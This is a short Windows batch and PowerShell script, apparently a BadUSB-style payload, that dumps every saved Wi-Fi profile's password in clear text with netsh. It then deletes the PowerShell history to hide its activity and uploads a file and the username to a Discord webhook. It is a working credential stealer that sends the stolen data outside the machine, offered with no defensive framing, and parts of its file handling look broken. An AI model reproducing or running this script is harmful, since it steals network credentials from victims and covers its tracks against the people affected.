@echo off
for /f "skip=9 tokens=1,* delims=:" %%a in ('netsh wlan show profile') do (
    if not "%%b"=="" (
        for /f "tokens=*" %%c in ("%%b") do (
            set "profileName=%%c"
            setlocal enabledelayedexpansion
            set "profileName=!profileName:~0!"
            netsh wlan show profile name="!profileName!" key=clear
            endlocal
        )
    )
)
powershell
$FileName = "$env:TMP/ResultadoFinal.txt"

> $FileName

Remove-Item (Get-PSreadlineOption).HistorySavePath

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP/$FileName}
